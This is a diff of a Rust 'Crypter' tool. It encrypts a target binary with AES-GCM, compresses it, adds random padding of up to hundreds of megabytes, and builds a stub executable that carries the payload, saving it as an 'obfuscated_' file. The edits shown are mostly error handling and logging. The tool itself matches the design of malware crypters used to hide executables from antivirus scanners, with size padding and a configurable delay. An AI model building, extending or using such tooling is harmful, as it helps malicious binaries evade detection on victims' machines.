@@ -40,10 +40,10 @@ impl Crypter {
     }
 
     fn parse_args() -> Result<Crypter, String> {
-        let args = parser::parser();
-        let max_file_size_mb = pkg::get_env_u64("MAX_FILE_SIZE_MB", 200);
-        let max_delay_seconds = pkg::get_env_u64("MAX_DELAY_SECONDS", 3000);
-        let max_padding_mb = pkg::get_env_u64("MAX_PADDING_MB", 200);
+        let args = parser::parser()?;
+        let max_file_size_mb = pkg::get_env_u64("MAX_FILE_SIZE_MB", 200)?;
+        let max_delay_seconds = pkg::get_env_u64("MAX_DELAY_SECONDS", 3000)?;
+        let max_padding_mb = pkg::get_env_u64("MAX_PADDING_MB", 200)?;
 
         if args.padding > max_padding_mb {
             return Err(format!("Padding size exceeds the maximum allowed size of {} MB.", max_padding_mb));
@@ -64,7 +64,7 @@ impl Crypter {
 
         let output = args.output.unwrap_or_else(|| {
             let mut output_path = target_binary.clone();
-            let file_name = output_path.file_name().unwrap().to_string_lossy();
+            let file_name = output_path.file_name().unwrap_or_default().to_string_lossy();
             output_path.set_file_name(format!("obfuscated_{}", file_name));
             output_path
         });
@@ -85,13 +85,14 @@ impl Crypter {
         let mut nonce_bytes = [0u8; 12];
         OsRng.fill_bytes(&mut nonce_bytes);
 
-        let key = pkg::derive_key(passphrase.as_bytes(), &nonce_bytes);
+        let key = pkg::derive_key(passphrase.as_bytes(), &nonce_bytes)?;
         let cipher = Aes256Gcm::new(Key::<Aes256Gcm>::from_slice(&key));
         let ciphertext = cipher.encrypt(Nonce::from_slice(&nonce_bytes), plaintext.as_ref()).map_err(|e| format!("AES-GCM encrypt failed ({} bytes): {:?}", plaintext.len(), e))?;
 
         self.key = Some(key);
         self.nonce = Some(nonce_bytes);
         self.payload = Some(ciphertext);
+        pkg::log_info("Target binary encrypted successfully.");
         Ok(())
     }
 
@@ -99,6 +100,7 @@ impl Crypter {
         let ciphertext = self.payload.take().ok_or("compress before encrypt")?;
         let compressed = zstd::encode_all(&ciphertext[..], 10).map_err(|e| format!("zstd compress failed: {}", e))?;
         self.payload = Some(compressed);
+        pkg::log_info("Payload compressed successfully.");
         Ok(())
     }
 
@@ -106,6 +108,7 @@ impl Crypter {
     fn write_payload(&self, stub_dir: &Path) -> Result<(), String> {
         let payload = self.payload.as_ref().ok_or("write_payload before compress")?;
         std::fs::write(stub_dir.join("payload.enc"), payload).map_err(|e| format!("write payload.enc: {}", e))?;
+        pkg::log_info("Payload written successfully.");
         Ok(())
     }
 
@@ -117,6 +120,7 @@ impl Crypter {
             OsRng.fill_bytes(&mut pad);
         }
         std::fs::write(stub_dir.join("padding.bin"), &pad).map_err(|e| format!("write padding.bin: {}", e))?;
+        pkg::log_info("Padding written successfully.");
         Ok(())
     }
 
@@ -140,6 +144,7 @@ impl Crypter {
         );
 
         std::fs::write(stub_dir.join("src/generated.rs"), src).map_err(|e| format!("write generated.rs: {}", e))?;
+        pkg::log_info("Stub configuration generated successfully.");
         Ok(())
     }
 }
@@ -154,6 +159,7 @@ fn build_stub(stub_dir: &Path) -> Result<PathBuf, String> {
     if !status.success() {
         return Err("stub build failed".to_string());
     }
+    pkg::log_info(&format!("Stub built successfully."));
     Ok(stub_dir.join("target/release/stub.exe"))
 }
 
@@ -174,16 +180,16 @@ fn main() {
     let mut crypter = match Crypter::parse_args() {
         Ok(c) => c,
         Err(err) => {
-            eprintln!("[ERROR] {}", err);
+            pkg::log_error(&format!("{}", err));
             std::process::exit(1);
         }
     };
 
     let stub_dir = PathBuf::from(env!("CARGO_MANIFEST_DIR")).parent().unwrap().join("stub");
     if let Err(err) = run(&mut crypter, &stub_dir) {
-        eprintln!("[ERROR]  {}", err);
+        pkg::log_error(&format!("{}", err));
         std::process::exit(1);
     }
 
-    println!("[INFO] binary saved as \"{}\".", crypter.output.display());
+    pkg::log_ok(&format!("Binary saved as \"{}\".", crypter.output.display()));
 }
